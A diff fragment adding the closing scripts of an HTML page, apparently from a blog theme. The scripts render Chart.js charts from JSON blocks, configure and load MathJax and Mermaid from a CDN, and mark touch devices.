+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
